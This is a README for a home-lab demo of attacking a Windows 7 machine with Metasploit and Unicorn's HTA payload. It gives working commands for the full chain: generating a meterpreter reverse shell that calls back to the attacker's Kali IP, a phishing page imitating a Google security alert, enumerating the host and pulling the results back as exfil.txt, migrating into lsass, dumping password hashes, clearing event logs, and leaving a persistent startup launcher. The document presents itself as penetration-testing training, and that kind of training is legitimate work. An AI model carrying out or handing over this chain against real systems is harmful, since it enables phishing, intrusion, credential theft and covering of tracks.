# Unicorn Demo 
I have built this as a way to demo attacking a Windows 7 machine using metasploit and Unicorn's HTA attack.
Todd Murray pdxgeek57@gmail.com

## Environment Details

Kali from https://www.kali.org/downloads/  
Unicorn from https://github.com/trustedsec/unicorn  
Windows 7 ISO en_windows_7_professional_with_sp1_x64_dvd_u_676939.iso from https://the-eye.eu/public/MSDN/Windows%207/  
I used VMware 11.5 on MacOS Catalina 10.15.2 but you can use other HyperVisors.  
**I would NOT reccomend AWS/Azure as they may interpret these activities as malicous and kill your environment/account**  
Note that VMware versions lower than 11 have display issues with VM's on Catalina  

## Kali Setup

Download and Install the latest Kali Linux 64-Bit Image  
Run 'apt update' and then 'apt upgrade'. This will update Kali to the latest including metasploit which we will be using.  
Enable Postgresql and Apache2 to start at boot 'systemctl enable postgresql' and 'systemctl enable apache2'  
Start Postgresql and Apache2 "systemctl start postgresql' and 'systemctl start apache2'  
Start Metasploit "msfconsole' to initialize the db then 'exit' out  

## Windows 7 Setup
 
Install Windows in a trial, no key is needed unless you have a valid license  
During install I created an administrator account named "admin". IF you use somethign else you will need to make changes later on.  
If you are testing against an AV solution make sure its in "Detect Only" mode.  
Upgrade Internet Explorer to version 11 by downloading to your host system and then dragging the exe into your VM  
    Note that Windows 7 lacks the appropriate certificates to browse https sites without this update https://go.microsoft.com/fwlink/?LinkId=324629
Disable UAC. You can google this if your not sure how.  


## Setup Kali (All done in a Terminal window, if you are not root you may need to use sudo for some commands)

Switch to /opt 'cd /opt'  
Download Unicorn 'git clone https://github.com/trustedsec/unicorn.git'  
Run 'ifconfig' and note your IP  
Switch to /opt/unicorn 'cd /opt/unicorn'  
Review the README.md  
Run unicorn.py using your kali IP and hta method for revese_tcp payload 'python unicorn.py windows/meterpreter/reverse_tcp 172.16.105.131 4444 hta'  
This generates and hta_attack folder that you now copy to /var/www/html 'cp hta_attack /var/www/html'  
Switch to /var/www/html/hta_attack 'cd /var/www/html/hta_attack'  
Use your favorite editor to modify unicorn.rc 'vi unicorn.rc'  
Make sure AutoVerifySession, AutoSystemInfo, and AutoLoadStdapi are all set to true then save your changes    

This generates the payload and metasploit configuration into our apache instance.  
In my case the URL is http://172.16.105.131/hta_attack/  
What i did next was generated a security event warning to my Google email. I copied the email and changed the "Check Activity" URL to the URL above". I also went into my Google account to the Security settings page and saved this page. I then edited /var/www/html/hta_attack/index.html and inserted the google code below the existing code making a slight modification to tell users to run the Security Checker tool when prompted. It's not perfect but its good enough to demonstrate a phishing attempt. You could clean this all up to better replicate the FROM address on the email and ensure the page looks exactly like the Google page.


## Next is to setup what we will do once we click the email link and open Launncher.hta

Download this repo that contains my demo.rc script  
Go back to /opt 'cd /opt/' and clone this repo 'git clone https://github.com/wond696/unicorn-demo.git'  
Switch to /opt/unicorn-demo and review demo.rc 'cd /opt/unicorn-demo' and 'cat demo.rc'  
My script is based on being logged in as a user named "admin", you may have to make modifications if you use a different account. Also, ensure the quotes in the file remain quotes, some text editors try to change one to a reverse quote which breaks the process  
You can modify this however you want but I found that trying to run everything in the script dies after creating a shell and causes a keyboard buffering problem so I'm only do base collection in the script and uploading files.  

## Download JAWS 'cd /opt' and 'git clone https://github.com/411Hall/JAWS.git'  
Review the README.md 'cat /opt/JAWS/README.md'  
  
Start our metasploit listener 'msfconsole -r /var/www/html/hta_attack/unicorn.rc'  
Launch the attack by clicking the email link or browsing to http://172.16.105.131/hta_attack/ and run/open the file when prompted  
This will generate a reverse tcp onto port 4444, you should see the session start.  
Confirm the session 'sessions -i'  
Connect to the session number 'sessions -i 1'  
Run demo.rc at the meterpreter prompt 'run /opt/unicorn-demo/demo.rc'  
Run the following commands (You may have to hit enter after the powershell commands run)  
'shell'  
'powershell Set-ExecutionPolicy -ExecutionPolicy Unrestricted' Enables powershell script execution.  
'powershell ./jaws-enum.ps1 exfil.txt' On your Windows 7 VM watch the C:\Users\Admin folder, when its done exfil.txt should be a little over 100k in size.  
'exit'  
'download exfil.txt'  
'rm jaws-enum.ps1'  
'rm exfil.txt'  
'run post/windows/manage/migrate' This should migrate you to a new notepad.exe process.  
'ps' Review and find the pid for lsass.exe  
'migrate 592' Use the pid for lsass.exe If this works you are now under a SYSTEM process.  
'hashdump' This will give you hashes that you might be able to convert to plaintext in jacktheripper or https://crackstation.net/  
'clearev' Clears Windows Logs


If you have followed this precisly and made changes to IP and username where needed you should have gather a lot of system information, have a exfil.txt file in your current directory, Launcher.hta should now be persitent by being in the users Start Menu > Startup. Reboot your Windows 7 VM to test, it should reconnect after you login.
